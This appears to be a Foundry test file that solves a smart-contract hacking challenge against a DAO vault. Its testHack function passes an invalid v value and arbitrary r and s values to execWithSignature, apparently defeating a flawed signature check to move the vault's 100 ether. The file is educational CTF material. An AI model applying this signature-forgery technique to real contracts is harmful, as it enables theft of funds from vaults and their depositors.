// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DaoVaultImplementation, FactoryDao, IDaoVault} from "../src/7_crystalDAO/crystalDAO.sol";
import {EIP712Upgradeable} from "@openzeppelin-upgradeable/contracts/utils/cryptography/EIP712Upgradeable.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge7Test is Test {
    FactoryDao factory;

    address public whitehat = makeAddr("whitehat");
    address public daoManager;
    uint256 daoManagerKey;

    IDaoVault vault;

    function setUp() public {
        (daoManager, daoManagerKey) = makeAddrAndKey("daoManager");
        factory = new FactoryDao();

        vm.prank(daoManager);
        vault = IDaoVault(factory.newWallet());

        // The vault has reached 100 ether in donations
        deal(address(vault), 100 ether);
    }

    function testHack() external {
        vm.startPrank(whitehat, whitehat);

        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge7Test -vvvv //
        ////////////////////////////////////////////////////*/

        address target = address(daoManager);

        // use random value for v r and s
        bytes32 r = keccak256(abi.encodePacked(uint256(1)));
        bytes32 s = keccak256(abi.encodePacked(uint256(2)));

        vault.execWithSignature(5, r, s, target, 100 ether, bytes(""), 100);
        //==================================================//
        vm.stopPrank();

        assertEq(daoManager.balance, 100 ether, "The Dao manager's balance should be 100 ether");
    }
}
